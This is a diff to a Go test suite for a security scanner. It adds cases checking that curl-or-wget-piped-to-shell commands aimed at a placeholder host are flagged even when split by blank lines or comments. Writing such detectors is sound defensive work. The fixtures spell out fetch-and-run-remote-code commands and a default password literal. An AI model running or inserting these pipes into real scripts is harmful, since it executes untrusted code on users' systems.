@@ -156,6 +156,8 @@ func TestSecurityTriageRulesCoverDynamicImagesAndTrackedText(t *testing.T) {
 		{name: "scripts/install.sh", line: "curl https://example.invalid/install \\\n| sh", rule: "REMOTE_SCRIPT_PIPE"},
 		{name: "scripts/install.sh", line: "curl https://example.invalid/install |\nsh", rule: "REMOTE_SCRIPT_PIPE"},
 		{name: "scripts/install.sh", line: "wget https://example.invalid/install |&\nbash", rule: "REMOTE_SCRIPT_PIPE"},
+		{name: "scripts/install.sh", line: "curl https://example.invalid/install |\n\nsh", rule: "REMOTE_SCRIPT_PIPE"},
+		{name: "scripts/install.sh", line: "curl https://example.invalid/install |\n# reviewed\nsh", rule: "REMOTE_SCRIPT_PIPE"},
 		{name: "compose.yml", line: "image: ${IMAGE:-attacker/image:latest}", rule: "MUTABLE_EXTERNAL_IMAGE"},
 		{name: "compose.yml", line: "image: bee-lab-evil:latest", rule: "MUTABLE_EXTERNAL_IMAGE"},
 		{name: "config.txt", line: "password=changeme", rule: "DEFAULT_CREDENTIAL_LITERAL"},
@@ -189,10 +191,18 @@ func TestSecurityTriageShellContinuationsAreBoundedAndRequireAnUnescapedBackslas
 		t.Fatalf("quoted pipe must not join shell lines: %#v", findings)
 	}
 
+	findings, err = scanSecurityFile("docs/design.md", "curl https://example.invalid/install \\\n| sh")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(findings) != 0 {
+		t.Fatalf("non-shell text must retain physical line boundaries: %#v", findings)
+	}
+
 	oversized := strings.Repeat("x", 600_000) + "\\\n" + strings.Repeat("y", 600_000)
 	if _, err := scanSecurityFile("scripts/install.sh", oversized); err == nil ||
-		!strings.Contains(err.Error(), "logical line rejected") {
-		t.Fatalf("expected oversized logical line rejection, got %v", err)
+		!strings.Contains(err.Error(), "logical line rejected: scripts/install.sh") {
+		t.Fatalf("expected path-bound oversized logical line rejection, got %v", err)
 	}
 }
 
